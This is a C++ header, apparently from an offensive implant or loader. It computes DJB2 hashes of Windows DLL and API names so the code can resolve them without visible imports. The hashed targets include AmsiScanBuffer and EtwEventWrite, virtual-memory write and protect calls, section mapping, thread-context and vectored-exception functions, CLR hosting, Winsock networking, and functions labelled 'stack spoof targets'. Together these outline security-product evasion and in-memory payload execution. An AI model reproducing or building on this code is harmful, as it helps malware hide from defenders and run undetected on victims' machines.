#pragma once
#include <cstdint>

// DJB2 hash - seed 5381, uint32_t, ASCII raw (no lowercase, no wide)
// Must be IDENTICAL to generate_hashes.py
constexpr uint32_t djb2_hash(const char* str) {
    uint32_t hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + static_cast<unsigned char>(*str);
        str++;
    }
    return hash;
}

// DLL name hashes (case-sensitive on the actual DLL name from PEB, which is lowercase Unicode -> we convert to lowercase ASCII)
// For DLL matching, we hash the lowercase ASCII name
constexpr uint32_t djb2_hash_case_insensitive(const char* str) {
    uint32_t hash = 5381;
    while (*str) {
        unsigned char c = static_cast<unsigned char>(*str);
        if (c >= 'A' && c <= 'Z') c += 32;
        hash = ((hash << 5) + hash) + c;
        str++;
    }
    return hash;
}

// --- DLL hashes (case-insensitive) ---
constexpr uint32_t HASH_NTDLL                = djb2_hash_case_insensitive("ntdll.dll");
constexpr uint32_t HASH_KERNEL32             = djb2_hash_case_insensitive("kernel32.dll");
constexpr uint32_t HASH_KERNELBASE           = djb2_hash_case_insensitive("kernelbase.dll");
constexpr uint32_t HASH_WS2_32              = djb2_hash_case_insensitive("ws2_32.dll");
constexpr uint32_t HASH_MSCOREE             = djb2_hash_case_insensitive("mscoree.dll");
constexpr uint32_t HASH_AMSI                = djb2_hash_case_insensitive("amsi.dll");
constexpr uint32_t HASH_ADVAPI32            = djb2_hash_case_insensitive("advapi32.dll");

// --- Function hashes (case-sensitive, exact function name) ---
// ntdll
constexpr uint32_t HASH_LdrLoadDll                  = djb2_hash("LdrLoadDll");
constexpr uint32_t HASH_RtlInitUnicodeString         = djb2_hash("RtlInitUnicodeString");
constexpr uint32_t HASH_NtAllocateVirtualMemory      = djb2_hash("NtAllocateVirtualMemory");
constexpr uint32_t HASH_NtProtectVirtualMemory       = djb2_hash("NtProtectVirtualMemory");
constexpr uint32_t HASH_NtWriteVirtualMemory         = djb2_hash("NtWriteVirtualMemory");
constexpr uint32_t HASH_NtFreeVirtualMemory          = djb2_hash("NtFreeVirtualMemory");
constexpr uint32_t HASH_NtOpenSection                = djb2_hash("NtOpenSection");
constexpr uint32_t HASH_NtMapViewOfSection           = djb2_hash("NtMapViewOfSection");
constexpr uint32_t HASH_NtUnmapViewOfSection         = djb2_hash("NtUnmapViewOfSection");
constexpr uint32_t HASH_NtClose                      = djb2_hash("NtClose");
constexpr uint32_t HASH_NtQueryInformationProcess    = djb2_hash("NtQueryInformationProcess");
constexpr uint32_t HASH_TpAllocWork                  = djb2_hash("TpAllocWork");
constexpr uint32_t HASH_TpPostWork                   = djb2_hash("TpPostWork");
constexpr uint32_t HASH_TpReleaseWork                = djb2_hash("TpReleaseWork");
constexpr uint32_t HASH_EtwEventWrite                = djb2_hash("EtwEventWrite");
constexpr uint32_t HASH_NtOpenFile                   = djb2_hash("NtOpenFile");
constexpr uint32_t HASH_NtCreateSection              = djb2_hash("NtCreateSection");
constexpr uint32_t HASH_RtlGetVersion                = djb2_hash("RtlGetVersion");
constexpr uint32_t HASH_NtWaitForSingleObject        = djb2_hash("NtWaitForSingleObject");

// kernel32
constexpr uint32_t HASH_GetThreadContext             = djb2_hash("GetThreadContext");
constexpr uint32_t HASH_SetThreadContext             = djb2_hash("SetThreadContext");
constexpr uint32_t HASH_GetCurrentThread             = djb2_hash("GetCurrentThread");
constexpr uint32_t HASH_AddVectoredExceptionHandler  = djb2_hash("AddVectoredExceptionHandler");
constexpr uint32_t HASH_RemoveVectoredExceptionHandler = djb2_hash("RemoveVectoredExceptionHandler");
constexpr uint32_t HASH_GetCurrentProcess            = djb2_hash("GetCurrentProcess");

// ws2_32
constexpr uint32_t HASH_WSAStartup                   = djb2_hash("WSAStartup");
constexpr uint32_t HASH_socket                       = djb2_hash("socket");
constexpr uint32_t HASH_connect                      = djb2_hash("connect");
constexpr uint32_t HASH_send                         = djb2_hash("send");
constexpr uint32_t HASH_recv                         = djb2_hash("recv");
constexpr uint32_t HASH_select                       = djb2_hash("select");
constexpr uint32_t HASH_closesocket                  = djb2_hash("closesocket");
constexpr uint32_t HASH_WSACleanup                   = djb2_hash("WSACleanup");
constexpr uint32_t HASH_getaddrinfo                  = djb2_hash("getaddrinfo");
constexpr uint32_t HASH_freeaddrinfo                 = djb2_hash("freeaddrinfo");

// mscoree
constexpr uint32_t HASH_CLRCreateInstance            = djb2_hash("CLRCreateInstance");

// stack spoof targets
constexpr uint32_t HASH_BaseThreadInitThunk          = djb2_hash("BaseThreadInitThunk");
constexpr uint32_t HASH_RtlUserThreadStart           = djb2_hash("RtlUserThreadStart");

// amsi
constexpr uint32_t HASH_AmsiScanBuffer               = djb2_hash("AmsiScanBuffer");
